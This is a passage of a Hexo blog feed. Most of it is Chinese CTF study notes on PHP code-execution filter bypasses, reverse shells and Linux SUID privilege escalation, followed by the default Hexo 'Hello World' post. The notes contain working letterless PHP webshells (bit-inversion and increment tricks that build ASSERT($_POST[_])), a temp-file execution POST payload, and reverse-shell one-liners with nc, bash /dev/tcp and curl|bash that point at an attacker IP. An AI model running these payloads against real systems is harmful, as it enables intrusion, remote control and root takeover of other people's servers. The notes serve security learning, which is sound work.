class="hljs-variable">%99</span><span class="hljs-variable">%90</span>)()<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>多字符构造也在羽师傅的脚本链接里</p><h3 id="汉字取反"><a href="#汉字取反" class="headerlink" title="汉字取反"></a>汉字取反</h3><p>利用的是 UTF-8 编码的某个汉字，将其中某个字符取出来，比如 和’{2 的结果是 “\x8c”，其再取反即可得到字母 s</p><p><img src="https://www.leavesongs.com/media/attachment/2017/02/17/fadccb70-4143-49df-aa47-bc9a1af93c56.97e405012da5.jpg" alt="14872686600768.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>); <span class="hljs-literal">true</span>+<span class="hljs-literal">true</span>==<span class="hljs-number">2</span><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>; <span class="hljs-comment">//1</span><br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]);<br></code></pre></td></tr></table></figure><p>一定要url编码之后才能提交 不然+号等会有影响</p><h3 id="自增绕过"><a href="#自增绕过" class="headerlink" title="自增绕过"></a>自增绕过</h3><p><img src="https://i.loli.net/2021/08/05/F7U62AfxwsEoyVZ.jpg" alt="img"></p><p>也就是说，’a’++ &#x3D;&gt; ‘b’，’b’++ &#x3D;&gt; ‘c’… 所以，我们只要能拿到一个变量，其值a，通过自增操作即可获得a-z中所有字符。</p><p>数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。</p><p>在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array</p><p>PHP函数是大小写不敏感的，所以我们最终执行的是ASSERT($<em>POST[</em>])，无需获取小写a</p><p>利用这个技巧，我们可以写下如下webshell</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs awk">&lt;?php<br><span class="hljs-variable">$_</span>=[];<br><span class="hljs-variable">$_</span>=@<span class="hljs-string">&quot;$_&quot;</span>; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-string">&#x27;Array&#x27;</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-string">&#x27;!&#x27;</span>==<span class="hljs-string">&#x27;@&#x27;</span>]; <span class="hljs-regexp">//</span> <span class="hljs-variable">$_</span>=<span class="hljs-variable">$_</span>[<span class="hljs-number">0</span>];<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>; <span class="hljs-regexp">//</span> A<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> S .拼接<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; <span class="hljs-regexp">//</span> S .拼接<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> E <br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; .拼接<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> R<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; .拼接<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<br><span class="hljs-variable">$___</span>.=<span class="hljs-variable">$__</span>; .拼接<br><br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> P<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>; .拼接<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> O<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>; .拼接<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> S<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>; .拼接<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++;<span class="hljs-variable">$__</span>++; <span class="hljs-regexp">//</span> T<br><span class="hljs-variable">$____</span>.=<span class="hljs-variable">$__</span>; .拼接<br><br><span class="hljs-variable">$_</span>=$<span class="hljs-variable">$____</span>;<br><span class="hljs-variable">$___</span>(<span class="hljs-variable">$_</span>[_]); <span class="hljs-regexp">//</span> ASSERT(<span class="hljs-variable">$_POST</span>[_]);<br></code></pre></td></tr></table></figure><p>也是要url编码</p><p>若是<strong>过滤了_</strong> 则可以用%ff代替</p><h3 id="php5-shell突破限制"><a href="#php5-shell突破限制" class="headerlink" title="php5+shell突破限制"></a>php5+shell突破限制</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$code</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$code</span>)&gt;<span class="hljs-number">35</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Long.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[A-Za-z0-9_$]+/&quot;</span>,<span class="hljs-variable">$code</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;NO.&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$code</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>若是没有()()这种形式的函数执行，且限制了长度，并且过滤了$,又该如何做呢</p><p>前置知识：</p><ol><li><p>shell下可以利用<code>.</code>来执行任意脚本</p></li><li><p>Linux文件名支持用glob通配符代替</p><p>而文件也可以通过构造数据包上传到&#x2F;tmp&#x2F;phpXXXXXX目录下</p><p>限制问题就是如何绕过限制来得到这个文件</p><p>glob通配符支持用<code>[^x]</code>的方法来构造“这个位置不是字符x”</p><p>利用这个通配符我们可以排除掉含有特殊字符的文件</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p>那么，我们可以利用<code>[@-[]</code>来表示大写字母：</p><p>执行临时文件的Payload </p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`. /???/????????[@-[]`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span>闭合前面<span class="hljs-meta">&lt;?php</span> ……<span class="hljs-keyword">eval</span>( <span class="hljs-meta">?&gt;</span> <span class="hljs-meta">&lt;?=</span>`…… `<span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?=</span> 相当于 <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <br>php也有一些段标签可用 其中，`<span class="hljs-meta">&lt;?</span> <span class="hljs-meta">?&gt;</span>` 相当于对 `<span class="hljs-meta">&lt;?php</span> <span class="hljs-meta">?&gt;</span>` 的替换<br></code></pre></td></tr></table></figure><p>构造如下数据包并post上去即可</p></li></ol><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs llvm">POST /?shell<span class="hljs-operator">=</span>?&gt;&lt;?<span class="hljs-operator">=</span>`.+/<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f/<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f<span class="hljs-variable">%3</span>f[<span class="hljs-variable">%40</span>-[]`<span class="hljs-variable">%3</span>b?&gt; HTTP/<span class="hljs-number">1.1</span><br>Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">43.210</span>:<span class="hljs-number">8080</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span><span class="hljs-comment">; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br>Accept: text/html<span class="hljs-punctuation">,</span>application/xhtml+xml<span class="hljs-punctuation">,</span>application/xml<span class="hljs-comment">;q=0.9,image/webp,*/*;q=0.8</span><br>Accept-Language: zh-CN<span class="hljs-punctuation">,</span>zh<span class="hljs-comment">;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br>Content-Type:multipart/form-data<span class="hljs-comment">;boundary=--------123</span><br>Accept-Encoding: gzip<span class="hljs-punctuation">,</span> deflate<br>Connection: close<br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><br>Content-Length: <span class="hljs-number">109</span><br><br>---------<span class="hljs-number">-123</span><br>Content-Disposition:form-data<span class="hljs-comment">;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><br>#!/bin/sh  // sh脚本的开头<br>ls /<br>---------<span class="hljs-number">-123</span>--<br></code></pre></td></tr></table></figure><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>SHELL语言是指UNIX操作系统的命令语言，同时又是该命令语言的解释程序的简称。shell本身是一个用C语言编写的程序，它是用户使用Unix&#x2F;Linux的桥梁，用户的大部分工作都是通过Shell完成的。Shell既是一种命令语言，又是一种程序设计语言。作为命令语言，它交互式地解释和执行用户输入的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。</p><p>shell类似于windows的命令行（cmd），可以输入特定的系统指令直接控制操作系统，实现读、写、执行文件等操作。</p><p><strong>RCE全称是remote command&#x2F;code execute，即远程执行漏洞</strong></p><p>在ctf题目中，rce往往非常重要，在攻击一台机器时，有时无法通过正向连接来打通，那么这时候就要进行反弹shell，使被攻击的机器自动来连接我们的服务器进行反向连接，这也往往是题目getshell的门槛</p><h2 id="利用netcat反弹shell"><a href="#利用netcat反弹shell" class="headerlink" title="利用netcat反弹shell"></a>利用netcat反弹shell</h2><p>常用命令 </p><p>攻击者开启本地监听</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">nc -lvvp port</span><br></code></pre></td></tr></table></figure><p>目标机主动连接</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">nc <span class="hljs-tag">&lt;<span class="hljs-name">攻击机IP</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">攻击机监听的端口</span>&gt;</span> -e /bin/bash<br></code></pre></td></tr></table></figure><h2 id="利用Bash反弹shell"><a href="#利用Bash反弹shell" class="headerlink" title="利用Bash反弹shell"></a>利用Bash反弹shell</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><table><thead><tr><th>命令</th><th>命令详解</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个bash交互环境。</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面相结合，然后一起重定向给后者。</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;47.xxx.xxx.72&#x2F;2333</td><td>Linux环境中所有的内容都是以文件的形式存在的，其实大家一看见这个内容就能明白，就是让目标主机与攻击机47.xxx.xxx.72的2333端口建立一个tcp连接。</td></tr><tr><td>0&gt;&amp;1</td><td>将标准输入与标准输出的内容相结合，然后重定向给前面标准输出的内容。</td></tr></tbody></table><p><strong>攻击机开启本地监听：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nc</span> -lvvp <span class="hljs-number">2333</span><br></code></pre></td></tr></table></figure><p><strong>目标机主动连接攻击机：</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><h2 id="Curl配合Bash反弹shell"><a href="#Curl配合Bash反弹shell" class="headerlink" title="Curl配合Bash反弹shell"></a>Curl配合Bash反弹shell</h2><p>这里操作也很简单，借助了Linux中的管道。</p><p>首先，在攻击者vps的web目录里面创建一个index文件（index.php或index.html），内容如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>/<span class="hljs-number">2333</span> <span class="hljs-number">0</span>&gt;&amp;<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>并开启2333端口的监听。</p><p>然后再目标机上执行如下，即可反弹shell：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">curl</span> <span class="hljs-number">47</span>.xxx.xxx.<span class="hljs-number">72</span>|bash<br><br></code></pre></td></tr></table></figure><p>更多反弹shell的操作见，以上已经够正常用了</p><p><a href="https://xz.aliyun.com/t/9488#toc-2">https://xz.aliyun.com/t/9488#toc-2</a></p><h1 id="系统提权"><a href="#系统提权" class="headerlink" title="系统提权"></a>系统提权</h1><p>为什么要提升权限？</p><p>linux有比windows更严格的权限管理，每个用户对每个文件的操作权限（读、写、执行）都不同，常常我们只能通过rce拿到低权限的用户，而一些文件（如flag）可能会需要root这样的高级权限用户才可以读，这时就需要提权</p><p>Linux提权大致分为以下几种</p><p>系统内核提权；第三方服务提权；数据库提权；密码收集提权；环境变量提权；Suid提权；Sudo提权；配置错误提权</p><p>这里记录以下遇到比较常见的提权先。</p><h2 id="利用suid提权"><a href="#利用suid提权" class="headerlink" title="利用suid提权"></a>利用suid提权</h2><p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。如果拥有SUID权限，那么就可以利用系统中的二进制文件和工具来进行root提权。</p><p>已知的可用来提权的linux可行性的文件列表如下：</p><ul><li><p>Nmap</p></li><li><p>Vim</p></li><li><p>find</p></li><li><p>Bash</p></li><li><p>More</p></li><li><p>Less</p></li><li><p>Nano</p></li><li><p>cp</p><p>首先，要了解find基本命令与提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-built_in">find</span> / -user root -perm -4000 -<span class="hljs-built_in">print</span> 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -perm <span class="hljs-attribute">-u</span>=s -type f 2&gt;/dev/<span class="hljs-literal">null</span><br><span class="hljs-built_in">find</span> / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;<br></code></pre></td></tr></table></figure><blockquote><p>准确的说，这个命令将从根目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到&#x2F;dev&#x2F;null，从而仅列出该用户具有访问权限的那些二进制文件</p></blockquote></li></ul><p>以下列通过ls -l 列出的权限中包含”s”，并且对应的是root权限。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">ls -l <span class="hljs-regexp">/usr/</span>bin/nmap<br><br>-rwsr-xr-x <span class="hljs-number">1</span> root root <span class="hljs-number">780676</span> <span class="hljs-number">2008</span>-<span class="hljs-number">04</span>-<span class="hljs-number">08</span> <span class="hljs-number">10</span>:<span class="hljs-number">04</span> <span class="hljs-regexp">/usr/</span>bin/nmap<br></code></pre></td></tr></table></figure><p>具体命令的提权方式见</p><p><a href="https://blog.csdn.net/Fly_hps/article/details/80428173">https://blog.csdn.net/Fly_hps/article/details/80428173</a></p><p>近期尝试着去复现了interstingphp这道题，里面用到了php读取配置函数、redis端口探测、php-redis执行原生的redis指令、php扩展的使用、反弹shell、suid提权、pkexec提权等一系列知识点，具体还待深入学习。</p><blockquote><p>参考博客</p><p><a href="https://www.freebuf.com/articles/web/321865.html">https://www.freebuf.com/articles/web/321865.html</a></p><p><a href="https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html">https://www.leavesongs.com/SHARE/some-tricks-from-my-secret-group.html</a></p><p><a href="https://xz.aliyun.com/t/9488#toc-2">https://xz.aliyun.com/t/9488#toc-2</a></p><p><a href="https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html">https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html</a></p><p><a href="https://www.freebuf.com/articles/web/333212.html">https://www.freebuf.com/articles/web/333212.html</a></p><p><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">https://blog.csdn.net/weixin_44912169/article/details/105845909</a></p><p><a href="https://custuvo.github.io/2021/08/04/jian-dan-zi-fu-gou-zao/#toc-heading-3">https://custuvo.github.io/2021/08/04/jian-dan-zi-fu-gou-zao/#toc-heading-3</a></p><p><a href="https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/1.3_linux_basic.html(%E4%B8%80%E4%BA%9B%E5%9F%BA%E7%A1%80%EF%BC%8C%E5%BE%85%E5%AD%A6%E4%B9%A0)">https://firmianay.gitbooks.io/ctf-all-in-one/content/doc/1.3_linux_basic.html(一些基础，待学习)</a></p><p><a href="http://4490.replace.favo.diafeng.cn/">http://4490.replace.favo.diafeng.cn/</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/08/12/hello-world/"/>
    <url>/2022/08/12/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a 